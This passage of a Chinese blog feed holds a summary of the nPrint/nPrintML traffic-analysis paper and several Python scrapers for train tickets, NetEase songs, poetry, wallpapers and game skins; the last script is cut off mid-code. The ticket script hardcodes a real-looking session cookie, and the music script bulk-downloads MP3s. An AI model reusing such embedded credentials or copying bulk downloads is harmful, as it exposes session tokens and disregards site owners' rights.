        <content type="html"><![CDATA[<h1 id="New-Directions-in-Automated-Traffic-Analysis论文学习"><a href="#New-Directions-in-Automated-Traffic-Analysis论文学习" class="headerlink" title="New Directions in Automated Traffic Analysis论文学习"></a>New Directions in Automated Traffic Analysis论文学习</h1><blockquote><p><strong>论文链接</strong>：<a href="https://dl.acm.org/doi/10.1145/3460120.3484758">New Directions in Automated Traffic Analysis | Proceedings of the 2021 ACM SIGSAC Conference on Computer and Communications Security</a></p></blockquote><h2 id="文章主要信息"><a href="#文章主要信息" class="headerlink" title="文章主要信息"></a>文章主要信息</h2><table><thead><tr><th>论文名称</th><th align="center">New Directions in Automated Traffic Analysis</th></tr></thead><tbody><tr><td>录用信息</td><td align="center">CCS 2021（CCF-A）</td></tr><tr><td>作者</td><td align="center"><a href="https://www.cs.princeton.edu/~jordanah/"> Jordan Holland</a>, Paul Schmitt, Nick Feamster, Prateek Mittal</td></tr><tr><td>论文链接</td><td align="center"><a href="https://dl.acm.org/doi/10.1145/3460120.3484758">https://dl.acm.org/doi/10.1145/3460120.3484758</a></td></tr><tr><td>源码</td><td align="center"><a href="https://github.com/nprint/nprint"> https://github.com/nprint/nprint</a></td></tr><tr><td>数据集</td><td align="center"><a href="https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F">https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F</a></td></tr></tbody></table><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>目前,机器学习技术被广泛应用于入侵检测、应用程序识别等网络流量分析任务中。但是，当我们使用机器学习方法时，特征提取、模型选择、参数调优等众多因素决定着模型的性能，每当面对不同的网络流量或新的任务，就需要研究人员重新考虑调整这些选项甚至重新建模，这个调整甚至是重建的过程往往需要大量人力成本和专业知识。并且，流量模式会不断的发生变化，使得模型和人工提取的特征过时。因此有必要为不同网络流量创建一个通用的表示，可以用于各种不同的模型，跨越广泛的问题类，并将整个建模过程自动化。该文关注通用的自动化网络流量分析问题，致力于使研究人员将更多的精力用于优化模型和特征上，并有更多的时间在实践中解释和部署最佳模型。</p><h2 id="自动化网络流量分析"><a href="#自动化网络流量分析" class="headerlink" title="自动化网络流量分析"></a>自动化网络流量分析</h2><p>本文提出一种自动化流量分析方法（nPrintML），使机器学习技术更容易应用于更广泛的流量分析任务。nPrintML 包含 nPrint 流量表示和 AutoML 两部分，首先 nPrint 通过对 IP 数据包头进行对齐和拼接形成统一的数据表征，然后使用 AutoGluon-Tabular 框架进行自动化的进行特征提取、模型搜索和超参数优化。作者在 8 个不同的流量分析任务上对 nPrintML 进行评估，都取得了很好的效果。</p><h2 id="数据表示-nPrint"><a href="#数据表示-nPrint" class="headerlink" title="数据表示 nPrint"></a>数据表示 nPrint</h2><p>对于流量分类问题，数据表示与模型选择同等重要，所以在应用机器学习方法时，如何对数据进行表示和编码是非常重要的一环。对于网络流量数据的编码需要满足以下4个要求：</p><ul><li>完整的表示。我们的目标不是选择特定的特征，而是一种统一的数据编码，以避免依赖专家知识，所以需要保留包含包头在内的所有数据包信息；</li><li>固定的大小。许多机器学习模型的输入总是保持相同的大小，所以每个数据包表示都必须是常量大小；</li><li>固有的规范化。当特征被归一化后，机器学习模型通常会表现得更好，也能减少训练时间并增加模型的稳定性，所以如果数据的初始表示本身就是规范化的，将会非常方便；</li><li>一致的表示。数据表示的每个位置都应该对应于所有数据包包头的相同部分，也就是说，即使协议和报文长度不同，特定的特征总是在数据包中具有相同的偏移量，对齐后的数据都能让模型基于这样的前提来学习特征表示。</li></ul><p>首先，来看一下传统的流量数据包头。</p><p><img src="https://s2.loli.net/2022/04/06/jIkEbltCHMYh9sR.png" alt="1.png"></p><p>​                                                      图1 语义表示法和朴素二进制表示法</p><p>如图1所示，网络流量表示的主要方式包括语义表示法和朴素二进制表示法。</p><ul><li>语义表示法：每个报头都有各自的语义字段，但它不保留具有区分度的可选字段的顺序，同时需要领域专业知识来解析每个协议的语义结构，即使拥有这些知识，后续也还是不可避免进行繁琐的特征工程；</li><li>朴素二进制表示法：使用数据包的原始位图表示来保持顺序，但是忽略了不同的大小和协议，导致两个数据包的特征向量对同一特征具有不同的含义，这种不对齐可能会在重要特征的地方引入噪声而降低模型性能，同时也因为无法将每一位都映射到语义上而导致不可解释。</li></ul><p>从图1中不难看出，不同的网络协议（如 TCP 和 UDP）有着不同的数据表示方案，甚至相同的网络协议（如 IP）也不相同（是否包含 Options 选项），这显然无法满足上述统一化数据表示的需求。因此，研究人员结合语义表示法和朴素二进制表示法提出一种统一的网络数据包表示方法<strong>nPrint</strong>（图 2）。</p><p><img src="https://s2.loli.net/2022/04/06/wqXfR7yOADHzLxQ.png" alt="2.png"></p><p>​                                                                                    图2 nPrint</p><p>nPrint 使用每种协议允许的最大包头长度来表示该协议，同时将不同协议头部拼接组合成固定长度的包头。首先，它会保证任何数据包都可以被完整表示而不丢失任何信息；然后，使用内部填充确保每个数据包以相同数量的特征表示，并且每个特征具有相同含义，这种在位级上可解释的表示使我们能够更好的理解模型；其次，直接使用数据包的位，区分于某个位被设置为0，将不存在的包头用-1填充；最后，每个数据包都用相同数量的特征表示，对于给定的网络流量分析任务，将载荷设置为可选的字节数。此外，nPrint具有模块化和可扩展的特性，不仅可以将其他协议添加到表示中，也可以将一组数据包表示串联起来构建多包的nPrint指纹。</p><p>因此，nPrint 符合了4大性质：</p><ul><li>完整性：理论上可以包含所有协议</li><li>不变性：数据表征可以是一个确定的长度</li><li>归一性：数据被表示为 1&#x2F;0&#x2F;-1</li><li>一致性：不同数据包头的同一选项在同一位置</li></ul><h2 id="nPrintML"><a href="#nPrintML" class="headerlink" title="nPrintML"></a>nPrintML</h2><p>作者将 nPrint 与 <a href="https://arxiv.org/abs/2003.06505">AutoGluon-Tabular</a> 框架相结合，提出 nPrintML，实现了实现了机器学习流程的自动化（如图3所示）。</p><p><img src="https://s2.loli.net/2022/04/06/BqpVTEaQ8eo3gY4.png" alt="3.png"></p><p>​                                                                             图3 nPrintML</p><blockquote><p>AutoGluon背后技术：<a href="https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0</a></p><p>AutoGluon在Windows下安装：<a href="https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788">https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788</a></p><p>论文：<a href="https://arxiv.org/abs/2003.06505">https://arxiv.org/abs/2003.06505</a> </p><p>文档：<a href="https://auto.gluon.ai/">https://auto.gluon.ai/</a> </p><p>代码：<a href="https://github.com/awslabs/autogluon">https://github.com/awslabs/autogluon</a></p></blockquote><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p>针对8个网络流量分析场景，图4展示了用nPrintML进行分析的案例研究，实验结果表明，nPrintML不仅可以解决不同场景的网络流量分析问题，并且具有相较于传统方法更好的性能。</p><p><img src="https://s2.loli.net/2022/04/06/uA3FM5Z7yNBGqLm.png" alt="4.png"></p><p>​                                                                                  图4 实验结果总览</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>将机器学习应用于网络安全中的流量分析任务的有效性取决于特征的选择和适当的表示，即不超过模型本身。本文为自动流量分析创建了一个新方向，提出了 nPrint，这是一种统一的数据包表示，它将原始网络数据包作为输入，并将其转换为适合表示学习和模型训练的格式，从而使机器学习过程的一部分自动化到目前为止，这在很大程度上是艰苦的和手动的。这种标准格式可以轻松地将网络流量分析与最先进的自动机器学习 (AutoML) 管道集成。 nPrintML 是 nPrint 与 AutoML 的集成，可自动学习相应任务的最佳模型、参数设置和特征表示。本文作者们将 nPrintML 应用于八种常见的网络流量分析任务，在许多情况下改进了最新技术。 nPrint 已经证明，许多网络流量分类任务都可以自动化，尽管存在许多未解决的问题，例如涉及多个流的自动时间序列分析和分类。 nPrint 最终应该应用于更大的分类问题集。</p><h2 id="代码阅读及复现"><a href="#代码阅读及复现" class="headerlink" title="代码阅读及复现"></a>代码阅读及复现</h2><p>(过两天再做……)</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] Nick Erickson, Jonas Mueller, Alexander Shirkov, Hang Zhang, Pedro Larroy, Mu Li, and Alexander Smola. 2020. AutoGluon-Tabular: Robust and Accurate AutoML for Structured Data. arXiv preprint arXiv:2003.06505 (2020).</p><p>[2] Holland J , Schmitt P , Feamster N , et al. New Directions in Automated Traffic Analysis. 2021 ACMComputer and Communications Security Conference [C]. 2021.</p><p>[3] <a href="https://blog.csdn.net/WellShark/article/details/122192656">https://blog.csdn.net/WellShark/article/details/122192656</a></p><p>[4] <a href="https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg">https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg</a></p>]]></content>
      
      
      <categories>
          
          <category> 论文学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 论文 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> 入侵检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2022/04/06/python-crawler/"/>
      <url>/2022/04/06/python-crawler/</url>
      
        <content type="html"><![CDATA[<h3 id="Python爬虫学习"><a href="#Python爬虫学习" class="headerlink" title="Python爬虫学习"></a>Python爬虫学习</h3><p>整理了一下以前写过的一些小爬虫。</p><h4 id="12306查票"><a href="#12306查票" class="headerlink" title="12306查票"></a>12306查票</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 12306Check.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反复查询加循环即可</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stations.json&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">text = f.read()</span><br><span class="line">city_json = json.loads(text)</span><br><span class="line">f.close()</span><br><span class="line">from_station = <span class="built_in">input</span>(<span class="string">&#x27;始发站：&#x27;</span>)</span><br><span class="line">to_station = <span class="built_in">input</span>(<span class="string">&#x27;终点站：&#x27;</span>)</span><br><span class="line">train_date = <span class="built_in">input</span>(<span class="string">&#x27;发车日期（格式：2022-04-03）：&#x27;</span>)</span><br><span class="line"><span class="comment"># from_station = &#x27;武汉&#x27;</span></span><br><span class="line"><span class="comment"># to_station = &#x27;长沙&#x27;</span></span><br><span class="line"><span class="comment"># train_date = &#x27;2022-04-06&#x27;</span></span><br><span class="line"><span class="comment"># print(city_json[from_station])</span></span><br><span class="line"><span class="comment"># print(city_json[to_station])</span></span><br><span class="line"><span class="comment"># print(train_date)</span></span><br><span class="line">url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.train_date&#x27;</span>: train_date,</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.from_station&#x27;</span>: city_json[from_station],</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.to_station&#x27;</span>: city_json[to_station],</span><br><span class="line"><span class="string">&#x27;purpose_codes&#x27;</span>: <span class="string">&#x27;ADULT&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;_uab_collina=164896135403377792450208; JSESSIONID=843F9AA2FC700ED2B8E8655CBA8E4AFD; BIGipServerotn=468713994.50210.0000; BIGipServerpool_passport=182714890.50215.0000; highContrastMode=defaltMode; guidesStatus=off; cursorStatus=off; RAIL_EXPIRATION=1649305414970; RAIL_DEVICEID=i7hoNlwMechBKbH0Ghsk6cswUh1nhyGKgfThBDYYiAGy_zBKBevr3wq6zqlS1GV-JvK0B-qVEYwihXSg-WVTUlOcG7NgUJc2INRx-UN6MMxdgg6sumeKjo2NXUwAOlNL7uSajwkmH4Aleee-puGjfAVFL2aVyYMY; route=9036359bb8a8a461c164a04f8f50b252; _jc_save_toStation=%u957F%u6C99%2CCSQ; _jc_save_fromDate=2022-04-03; _jc_save_toDate=2022-04-03; _jc_save_wfdc_flag=dc; _jc_save_fromStation=%u6B66%u6C49%2CWHN&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,params=data,headers=headers)</span><br><span class="line"><span class="comment"># &lt;Response [200]&gt; 获取响应体对象</span></span><br><span class="line"><span class="comment"># response.text 获取响应体的文本数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乱码时可以使用以下方法</span></span><br><span class="line"><span class="comment"># response.encoding = &#x27;utf-8&#x27; #指定utf-8</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动转码</span></span><br><span class="line">result = response.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> result:</span><br><span class="line">index_list = index.replace(<span class="string">&#x27;有&#x27;</span>,<span class="string">&#x27;Yes&#x27;</span>).replace(<span class="string">&#x27;无&#x27;</span>,<span class="string">&#x27;No&#x27;</span>).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="comment"># index_list = index.split(&#x27;|&#x27;)</span></span><br><span class="line">TrainNum = index_list[<span class="number">3</span>]</span><br><span class="line">StartTime = index_list[<span class="number">8</span>]</span><br><span class="line">EndTime = index_list[<span class="number">9</span>]</span><br><span class="line">UseTime = index_list[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;G&#x27;</span> <span class="keyword">in</span> TrainNum):</span><br><span class="line">BussinessSeats = index_list[<span class="number">32</span>] <span class="comment">#商务座</span></span><br><span class="line">FirstSeats = index_list[<span class="number">31</span>] <span class="comment">#一等座</span></span><br><span class="line">SecondSeats = index_list[<span class="number">30</span>] <span class="comment">#二等座</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: BussinessSeats,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: FirstSeats,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: SecondSeats,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">SoftBeds = index_list[<span class="number">23</span>] <span class="comment">#软卧</span></span><br><span class="line">HardBeds = index_list[<span class="number">28</span>] <span class="comment">#硬卧</span></span><br><span class="line">HardSeats = index_list[<span class="number">29</span>] <span class="comment">#硬座</span></span><br><span class="line">NoSeats = index_list[<span class="number">26</span>] <span class="comment">#无座</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: SoftBeds,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: HardBeds,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: HardSeats,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: NoSeats</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(di)</span></span><br><span class="line">lis.append(di)</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_rows&#x27;</span>,<span class="literal">None</span>) <span class="comment">#展示最大化，把所有行展示出来</span></span><br><span class="line">content = pd.DataFrame(lis)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/fDMaIr74u2E1OZn.png" alt="image-20220406083305519.png"></p><p>生成stations.json文件：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_station_code.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResponse</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(url,headers = headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js&quot;</span></span><br><span class="line">    data = getResponse(url)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        dict_data = &#123;&#125;</span><br><span class="line">        text = data.text</span><br><span class="line">        str_split = text.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> chars <span class="keyword">in</span> str_split[<span class="number">1</span>:]:</span><br><span class="line">            station = chars.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            dict_data[station[<span class="number">1</span>]] = station[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stations.json&quot;</span>,<span class="string">&#x27;w&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            json.dump(dict_data,fp,ensure_ascii = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="网易云热歌爬取"><a href="#网易云热歌爬取" class="headerlink" title="网易云热歌爬取"></a>网易云热歌爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 163MusicGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;music\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/discover/toplist?id=19723756&quot;</span> <span class="comment">#不同榜单切换该id即可</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">html_data = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;/song\?id=(\d+)&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,response.text) <span class="comment"># ？前面记得加个转义字符</span></span><br><span class="line"><span class="keyword">for</span> music_id,music_name <span class="keyword">in</span> html_data:</span><br><span class="line"><span class="comment"># 下载地址：https://music.163.com/song/media/outer/url?id=1933915376.mp3</span></span><br><span class="line">music_url = <span class="string">f&quot;https://music.163.com/song/media/outer/url?id=<span class="subst">&#123;music_id&#125;</span>.mp3&quot;</span></span><br><span class="line">music_content = requests.get(url=music_url,headers=headers).content</span><br><span class="line">music_name = change_name(music_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + music_name +<span class="string">&#x27;.mp3&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(music_content)</span><br><span class="line"><span class="built_in">print</span>(music_id,music_name)</span><br></pre></td></tr></table></figure><p>MP3文件保存在music文件夹下：</p><p><img src="https://s2.loli.net/2022/04/06/u73hIWizV69jsMb.png" alt="image-20220406084013424.png"></p><h4 id="古诗词爬取"><a href="#古诗词爬取" class="headerlink" title="古诗词爬取"></a>古诗词爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PoetryGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.oh100.com/shici/1127009.html&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">li = re.findall(<span class="string">&quot;\d+?、(.*?)&lt;/p&gt;&lt;p&gt;&quot;</span>,response.text)</span><br><span class="line">li[-<span class="number">1</span>] = re.sub(<span class="string">r&quot;&lt;/p&gt;&lt;script&gt;s\(\&quot;content_relate\&quot;\)\;\&lt;\/script\&gt;\&lt;p\&gt;\【形容洒脱的诗词\】相关文章\：&quot;</span>,<span class="string">&quot;&quot;</span>,li[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> se <span class="keyword">in</span> li:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;- &quot;</span>+se)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/JXvfrT9FMqRDAPa.png" alt="image-20220406084235256.png"></p><h4 id="壁纸爬取"><a href="#壁纸爬取" class="headerlink" title="壁纸爬取"></a>壁纸爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WallPaperGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">整体思路：</span></span><br><span class="line"><span class="string">1、访问网站查看信息（F12不可用可以先在别的网页打开再访问该网址）</span></span><br><span class="line"><span class="string">2、进入对应tag观察request的headers等信息（注意要点击加载更多后再看XHR下的文件）</span></span><br><span class="line"><span class="string">3、进入特定照片观察信息</span></span><br><span class="line"><span class="string">4、在text属性中获取title、img_url等信息</span></span><br><span class="line"><span class="string">5、在本地保存下来</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;img\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_title</span>(<span class="params">name</span>): <span class="comment">#重命名文件，防止原有保存文件名不合法</span></span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>): <span class="comment">#指定页数</span></span><br><span class="line">url = <span class="string">f&quot;https://m.bcoderss.com/tag/%e7%be%8e%e5%a5%b3/page/<span class="subst">&#123;page&#125;</span>/&quot;</span> <span class="comment"># %e7%be%8e%e5%a5%b3代表了美女这个标签，可以自行选择</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,headers=headers) <span class="comment">#该网站是个post请求但是不需要传params</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">href = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&#x27;</span>,response.text)[<span class="number">2</span>:] <span class="comment">#找到所有的照片初始地址，前两个是无用地址</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> href:</span><br><span class="line">response_1 = requests.get(url=index,headers=headers) <span class="comment">#访问照片初始地址</span></span><br><span class="line">title = re.findall(<span class="string">&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#获取照片标题</span></span><br><span class="line">title = change_title(title)</span><br><span class="line">img_url = re.findall(<span class="string">&#x27;&lt;img alt=&quot;.*?&quot; title=&quot;.*?&quot; src=&quot;(.*?)&quot;&gt;&#x27;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#获取照片下载地址</span></span><br><span class="line">img_content = requests.get(url=img_url,headers=headers).content <span class="comment">#获取照片内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + title + <span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#保存照片</span></span><br><span class="line">f.write(img_content)</span><br><span class="line"><span class="built_in">print</span>(title,img_url)</span><br></pre></td></tr></table></figure><p>壁纸会保存在img文件夹下（图片不是很适合放出来，就放下文字吧…）</p><p><img src="https://s2.loli.net/2022/04/06/hgFZor87UKQkRjd.png" alt="image-20220406084429168.png"></p><h4 id="LOL英雄皮肤图片爬取"><a href="#LOL英雄皮肤图片爬取" class="headerlink" title="LOL英雄皮肤图片爬取"></a>LOL英雄皮肤图片爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># LOL.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&#x27;<span class="subst">&#123;name+title&#125;</span>\\&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line">newname = 